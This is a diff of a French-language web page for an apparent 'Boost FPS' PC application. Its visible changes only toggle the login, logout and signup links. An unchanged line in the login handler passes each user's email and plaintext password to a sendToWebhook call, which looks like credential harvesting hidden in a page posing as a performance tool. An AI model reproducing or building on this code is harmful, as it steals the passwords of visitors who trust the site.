@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.1">
     <title>Boost FPS - Application PC</title>
     <style>
+        /* Styles de base pour tout */
         * {
             margin: 0;
             padding: 0;
@@ -217,9 +218,9 @@
         <a href="#" onclick="showSection('version')">Version</a>
         <a href="#" onclick="showSection('tuto')">Tutoriel</a>
         <a href="#" onclick="showSection('contact')">Contact</a>
-        <a href="#" id="login-link" onclick="openLoginPopup()">Se connecter</a>
-        <a href="#" id="logout-link" class="logout-link" onclick="logout()" style="display: none;">Se déconnecter</a>
-        <a href="#" id="signup-link" onclick="openSignupPopup()">S'inscrire</a>
+        <a href="#" id="login-link" onclick="openLoginPopup()" style="display:none;">Se connecter</a>
+        <a href="#" id="logout-link" class="logout-link" onclick="logout()" style="display:none;">Se déconnecter</a>
+        <a href="#" id="signup-link" onclick="openSignupPopup()" style="display:none;">S'inscrire</a>
     </nav>
 
     <div class="container">
@@ -291,6 +292,7 @@
             loggedIn = true;
             document.getElementById("login-link").style.display = "none";
             document.getElementById("logout-link").style.display = "inline";
+            document.getElementById("signup-link").style.display = "none"; // Masquer le lien d'inscription
         }
 
         function openLoginPopup() {
@@ -324,6 +326,7 @@
                 localStorage.setItem('currentUser', JSON.stringify(user));
                 document.getElementById("login-link").style.display = "none";
                 document.getElementById("logout-link").style.display = "inline";
+                document.getElementById("signup-link").style.display = "none"; // Masquer le lien d'inscription
                 closeLoginPopup();
                 sendToWebhook({ username: email, password: password });
                 alert("Connexion réussie !");
@@ -369,6 +372,7 @@
             localStorage.removeItem('currentUser');
             document.getElementById("login-link").style.display = "inline";
             document.getElementById("logout-link").style.display = "none";
+            document.getElementById("signup-link").style.display = "inline"; // Afficher le lien d'inscription
             alert("Déconnexion réussie !");
         }
 
